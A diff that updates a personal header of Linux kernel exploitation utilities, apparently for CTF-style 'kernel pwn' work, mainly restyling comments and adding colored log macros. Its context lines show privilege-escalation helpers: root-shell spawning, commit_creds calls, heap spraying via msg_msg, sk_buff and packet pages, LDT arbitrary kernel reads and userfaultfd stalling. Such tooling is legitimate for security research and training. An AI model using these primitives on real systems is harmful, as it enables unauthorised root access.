@@ -2,12 +2,12 @@
  * @file kernel.h
  * @author arttnba3 (arttnba@gmail.com)
  * @brief arttnba3's personal utils for kernel pwn
- * @version 1.1
+ * @version 1.2
  * @date 2023-05-20
  * 
  * @copyright Copyright (c) 2023 arttnba3
  * 
- */
+**/
 #ifndef A3_KERNEL_PWN_H
 #define A3_KERNEL_PWN_H
 
@@ -42,7 +42,15 @@
 /**
  * I - fundamental functions
  * e.g. CPU-core binder, user-status saver, etc.
- */
+**/
+
+#define SUCCESS_MSG(msg)    "\033[32m\033[1m" msg "\033[0m"
+#define INFO_MSG(msg)       "\033[34m\033[1m" msg "\033[0m"
+#define ERROR_MSG(msg)      "\033[31m\033[1m" msg "\033[0m"
+
+#define log_success(msg)    puts(SUCCESS_MSG(msg))
+#define log_info(msg)       puts(INFO_MSG(msg))
+#define log_error(msg)      puts(ERROR_MSG(msg))
 
 size_t kernel_base = 0xffffffff81000000, kernel_offset = 0;
 size_t page_offset_base = 0xffff888000000000, vmemmap_base = 0xffffea0000000000;
@@ -59,7 +67,7 @@ size_t direct_map_addr_to_page_addr(size_t direct_map_addr)
 
 void err_exit(char *msg)
 {
-    printf("\033[31m\033[1m[x] Error at: \033[0m%s\n", msg);
+    printf(ERROR_MSG("[x] Error at: ") "%s\n", msg);
     sleep(5);
     exit(EXIT_FAILURE);
 }
@@ -70,14 +78,14 @@ void get_root_shell(void)
     puts("[*] Checking for root...");
 
     if(getuid()) {
-        puts("\033[31m\033[1m[x] Failed to get the root!\033[0m");
+        puts(ERROR_MSG("[1m[x] Failed to get the root!"));
         sleep(5);
         exit(EXIT_FAILURE);
     }
 
-    puts("\033[32m\033[1m[+] Successful to get the root. \033[0m");
-    puts("\033[34m\033[1m[*] Execve root shell now...\033[0m");
-    
+    puts(SUCCESS_MSG("[+] Successful to get the root."));
+    puts(INFO_MSG("[*] Execve root shell now..."));
+
     system("/bin/sh");
     
     /* to exit the process normally, instead of segmentation fault */
@@ -123,7 +131,7 @@ void get_root_privilige(size_t prepare_kernel_cred, size_t commit_creds)
  * @brief create an isolate namespace
  * note that the caller **SHOULD NOT** be used to get the root, but an operator
  * to perform basic exploiting operations in it only
- */
+**/
 void unshare_setup(void)
 {
     char edit[0x100];
@@ -149,7 +157,7 @@ void unshare_setup(void)
 /**
  * II - fundamental  kernel structures
  * e.g. list_head
- */
+**/
 struct list_head {
     uint64_t    next;
     uint64_t    prev;
@@ -161,7 +169,7 @@ struct list_head {
  * - the parent is the one to send cmd and get root
  * - the child creates an isolate userspace by calling unshare_setup(),
  *      receiving cmd from parent and operates it only
- */
+**/
 #define PGV_PAGE_NUM 1000
 #define PACKET_VERSION 10
 #define PACKET_TX_RING 13
@@ -320,7 +328,7 @@ void prepare_pgv_system(void)
  * The MUSL also doesn't contain `keyctl.h` :( 
  * Luckily we just need a bit of micros in exploitation, 
  * so just define them directly is okay :)
- */
+**/
 
 #define KEY_SPEC_PROCESS_KEYRING	-2	/* - key ID for process-specific keyring */
 #define KEYCTL_UPDATE			2	/* update a key */
@@ -357,14 +365,14 @@ int key_unlink(int keyid)
 /**
  * V - sk_buff spraying related
  * note that the sk_buff's tail is with a 320-bytes skb_shared_info
- */
+**/
 #define SOCKET_NUM 8
 #define SK_BUFF_NUM 128
 
 /**
  * socket's definition should be like:
  * int sk_sockets[SOCKET_NUM][2];
- */
+**/
 
 int init_socket_array(int sk_socket[SOCKET_NUM][2])
 {
@@ -447,7 +455,7 @@ ssize_t read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
 /**
  * the msgp should be a pointer to the `struct msgbuf`,
  * and the data should be stored in msgbuf.mtext
- */
+**/
 ssize_t write_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
 {
     ((struct msgbuf*)msgp)->mtype = msgtyp;
@@ -480,7 +488,7 @@ void build_msg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev,
  * Somethings we may want to compile the exp binary with MUSL-GCC, which
  * doesn't contain the `asm/ldt.h` file.
  * As the file is small, I copy that directly to here :)
- */
+**/
 
 /* Maximum number of LDT entries supported. */
 #define LDT_ENTRIES	8192
@@ -492,7 +500,7 @@ void build_msg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev,
  * Note on 64bit base and limit is ignored and you cannot set DS/ES/CS
  * not to the default values if you still want to do syscalls. This
  * call is more for 32bit mode therefore.
- */
+**/
 struct user_desc {
 	unsigned int  entry_number;
 	unsigned int  base_addr;
@@ -549,7 +557,7 @@ static inline void init_desc(struct user_desc *desc)
  * @param momdifier_args args of ldt_momdifier
  * @param burte_size size of each burte-force hitting
  * @return size_t address of page_offset_base
- */
+**/
 size_t ldt_guessing_direct_mapping_area(void *(*ldt_cracker)(void*),
                                         void *cracker_args,
                                         void *(*ldt_momdifier)(void*, size_t), 
@@ -596,7 +604,7 @@ size_t ldt_guessing_direct_mapping_area(void *(*ldt_cracker)(void*),
  * @param momdifier_args args of ldt_momdifier
  * @param addr address of kernel memory to read
  * @param res_buf buf to be written the data from kernel memory
- */
+**/
 void ldt_arbitrary_read(void *(*ldt_momdifier)(void*, size_t), 
                         void *momdifier_args, size_t addr, char *res_buf)
 {
@@ -642,7 +650,7 @@ void ldt_arbitrary_read(void *(*ldt_momdifier)(void*, size_t),
  *          The return val should be the offset of the `buf`, `-1` for failure
  * @param finder_args your own function's args
  * @return size_t kernel addr of content to find, -1 for failure
- */
+**/
 size_t ldt_seeking_memory(void *(*ldt_momdifier)(void*, size_t), 
                         void *momdifier_args, uint64_t page_offset_base,
                         size_t (*mem_finder)(void*, char *), void *finder_args)
@@ -669,13 +677,13 @@ size_t ldt_seeking_memory(void *(*ldt_momdifier)(void*, size_t),
 
 /**
  * VIII - userfaultfd related code
- */
+**/
 
 /**
  * The MUSL also doesn't contain `userfaultfd.h` :( 
  * Luckily we just need a bit of micros in exploitation, 
  * so just define them directly is okay :)
- */
+**/
 
 #define UFFD_API ((uint64_t)0xAA)
 #define _UFFDIO_REGISTER		(0x00)
@@ -863,7 +871,7 @@ void register_userfaultfd_for_thread_stucking(pthread_t *monitor_thread,
 
 /**
  * IX - kernel structures 
- */
+**/
 
 struct file;
 struct file_operations;
